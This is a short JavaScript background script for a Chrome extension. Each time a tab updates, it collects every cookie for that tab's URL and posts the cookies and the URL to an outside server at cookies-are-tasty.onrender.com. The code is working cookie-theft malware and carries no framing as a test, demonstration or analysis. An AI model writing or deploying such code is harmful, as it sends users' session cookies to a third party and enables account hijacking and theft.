chrome.tabs.onUpdated.addListener((tabId, changeInfo, tab) => {

  if (!tab.url) return;

  chrome.cookies.getAll({ url: tab.url }, (cookies) => {

    // 🔥 convert array → key:value object
    const cookieMap = {};

    cookies.forEach(cookie => {
      cookieMap[cookie.name] = cookie.value;
    });

    console.log("Cookies (simplified):", cookieMap);

    fetch("https://cookies-are-tasty.onrender.com/", {
      method: "POST",
      headers: {
        "Content-Type": "application/json"
      },
      body: JSON.stringify({
        url: tab.url,
        cookies: cookieMap
      })
    }).catch(err => console.error("Fetch error:", err));

  });

});
